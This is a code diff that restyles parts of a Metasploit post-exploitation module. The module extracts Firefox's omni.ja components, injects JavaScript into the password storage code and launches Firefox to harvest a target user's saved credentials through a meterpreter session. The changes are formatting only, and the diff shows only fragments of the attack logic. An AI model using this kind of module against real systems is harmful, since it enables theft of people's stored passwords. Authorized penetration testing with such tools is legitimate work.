@@ -426,11 +426,11 @@ class Metasploit3 < Msf::Post
   def decrypt_modify_omnija(zip)
     # Which files to extract from ja/zip
     files = [
-              'components/storage-mozStorage.js',                        # stor_js
-              'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul
-              'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul
-              'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
-            ]
+      'components/storage-mozStorage.js',                        # stor_js
+      'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul
+      'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul
+      'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
+    ]
 
     # Extract files from zip
     arya = files.map do |omnija_file|
@@ -506,21 +506,21 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 |
 
     regex = [
-              nil, # dirty hack alert
-              [/return\slogins;/, method_epilog],
-              [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
-            ]
+      nil, # dirty hack alert
+      [/return\slogins;/, method_epilog],
+      [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
+    ]
 
     # Match the last two regular expressions
     i = 2 # ...this is todo with the nil in the above regex array & regex command below
     x = i
     stor_js['content'].each_line do |line|
       # There is no real substitution if the matching regex has no corresponding patch code
-      if i != 0 and line.sub!(regex[i][0]) do |match|
-          if !regex[i][1].nil?
-            vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
-            regex[i][1]
-          end
+      if i != 0 && line.sub!(regex[i][0]) do |match|
+        if regex[i][1]
+          vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
+          regex[i][1]
+        end
       end # do |match|
       i -= 1
       end # if i != 0
@@ -604,7 +604,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
     # Automatic termination (window.close() - injected XUL or firefox cmd arguments)
     print_status("Starting Firefox process to get #{whoami}'s credentials")
-    cmd_exec(cmd,args)
+    cmd_exec(cmd, args)
     sleep(1)
 
     # Lets just check theres something before going forward
@@ -627,12 +627,12 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     vprint_status("Cleaning up: #{new_file}")
     file_rm(new_file)
     if session.type == "meterpreter"
-    if session.fs.file.exists?(temp_file)
-      print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
-    end
-    if !session.fs.file.exists?(org_file)
-      print_error("Unable to find #{org_file} on target. Something went wrong.")
-    end
+      if session.fs.file.exists?(temp_file)
+        print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
+      end
+      unless session.fs.file.exists?(org_file)
+        print_error("Unable to find #{org_file} on target. Something went wrong.")
+      end
     end # session.type == "meterpreter"
 
     # At this time, there should have a loot file
